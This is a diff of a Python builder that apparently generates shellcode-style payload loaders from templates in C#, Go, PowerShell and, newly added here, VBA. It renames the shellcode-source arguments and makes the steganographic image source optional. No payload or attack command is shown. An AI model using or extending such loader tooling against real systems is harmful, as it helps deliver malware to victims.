@@ -9,9 +9,7 @@ from colorama import Style, Fore
 from yaml import safe_load
 from loguru import logger
 
-from algorithms.LSBX import Channel
 from src.ps_minifier import minify_PS
-
 
 @dataclass
 class Runner:
@@ -21,10 +19,10 @@ class Runner:
     arch: str
 
     language: str
-    image_source: str
     payload: str
     algorithm: str
 
+    image_source: str = field(default_factory=str)
     params: dict = field(default_factory=dict)
 
     @classmethod
@@ -50,9 +48,9 @@ def get_runner(runner_config: str, **kwargs):
     if builder.build():
         logger.artifact(f'Runner is at {Fore.RED}{builder.artifact_path}{Style.RESET_ALL}')
         if kwargs:
-            logger.info(f'Usage: {runner.name}.{builder.build_extension} {kwargs["PAYLOAD_BITS"]} {kwargs["SC_SOURCE"]}')
+            logger.info(f'Usage: {runner.name}.{builder.build_extension} {kwargs["BYTE_LENGTH"]} {kwargs["PAYLOAD_SOURCE"]}')
         else:
-            logger.info(f'Usage: {runner.name}.{builder.build_extension} PAYLOAD_BITS SC_SOURCE')
+            logger.info(f'Usage: {runner.name}.{builder.build_extension} PAYLOAD_SIZE PAYLOAD_SOURCE')
 
 
 class Builder:
@@ -121,6 +119,7 @@ class Builder:
             'csharp': CSharpBuilder,
             'go': GoBuilder,
             'powershell': PowershellBuilder,
+            'vba': VbaBuilder
         }
         try:
             return implementations[runner.language](runner)
@@ -251,3 +250,19 @@ class PowershellBuilder(Builder):
         with open(f'{self.main_file}', 'w') as f:
             f.write(minify_PS(script))
 
+
+class VbaBuilder(Builder):
+    sources_extension = 'vba'
+    build_extension = sources_extension
+
+    def preprocess_sources(self):
+        with open(f'algorithms/{self.runner.algorithm.lower()}.{self.sources_extension}') as f:
+            self.runner.params.update({'ALGORITHM_CODE': chevron.render(f.read(), self.runner.params)})
+        
+        with open(f'arches/{self.runner.arch.lower()}.{self.sources_extension}') as f:
+            self.runner.params.update({'ARCH_IMPORTS': chevron.render(f.read(), self.runner.params)})
+
+        with open(f'payloads/{self.runner.payload.lower()}_{self.runner.arch.lower()}.{self.sources_extension}') as f:
+            self.runner.params.update({'PAYLOAD_CODE': chevron.render(f.read(), self.runner.params)})
+
+        return super().preprocess_sources()
